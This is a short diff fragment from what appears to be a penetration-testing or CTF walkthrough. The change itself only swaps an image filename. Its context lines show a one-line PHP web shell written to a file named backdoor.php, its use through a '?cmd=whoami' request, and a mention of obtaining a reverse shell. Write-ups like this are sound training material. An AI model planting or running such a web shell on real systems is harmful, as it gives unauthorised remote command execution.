@@ -160,7 +160,7 @@ echo -e '<?php\n  system($_REQUEST['cmd']);\n?>' > /mnt/backdoor.php
 
 Commands can be executed through the web browser via <mark style="color:yellow;">`?cmd=whoami`</mark>
 
-<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (1) (8).png" alt=""><figcaption></figcaption></figure>
 
 Let's grab a reverse shell through revshells and gain access to this machine
 
